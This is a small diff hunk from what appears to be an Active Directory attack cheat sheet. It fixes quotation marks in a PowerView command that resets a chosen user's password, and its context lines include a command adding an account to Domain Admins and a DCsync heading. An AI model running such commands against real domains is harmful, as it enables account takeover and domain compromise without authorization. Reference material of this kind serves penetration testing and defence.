@@ -678,7 +678,7 @@ Net group "domain admins" sportless /add /domain
 
 #### Abuse resetpassword using powerview_dev
 ```
-Set-DomainUserPassword -Identity <username> -AccountPassword (ConvertTo-SecureString “Password@123” -AsPlainText -Force ) Verbose
+Set-DomainUserPassword -Identity <username> -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force ) Verbose
 ```
 
 ### DCsync
